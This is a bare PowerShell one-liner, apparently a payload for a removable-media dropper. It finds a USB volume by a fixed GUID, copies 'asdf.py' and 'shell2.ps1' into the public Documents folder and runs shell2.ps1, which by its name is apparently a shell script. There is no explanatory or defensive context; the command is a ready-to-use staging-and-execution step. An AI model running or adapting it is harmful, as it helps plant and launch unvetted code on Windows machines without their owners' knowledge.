$Drives = Get-WmiObject -Class Win32_Volume | Select DriveLetter, DeviceID | select-string "Volume{4f72a728-4ed6-11ec-860d-3c7c3fb811ea}"; $Drives = ([regex]::match($Drives, "DriveLetter=[A-Z]")).Value.replace("DriveLetter=",'')+":"; Copy-Item "$Drives/asdf.py" -Destination "C:/Users/Public/Documents"; Copy-Item "$Drives/shell2.ps1" -Destination "C:/Users/Public/Documents";C:/Users/Public/Documents/shell2.ps1
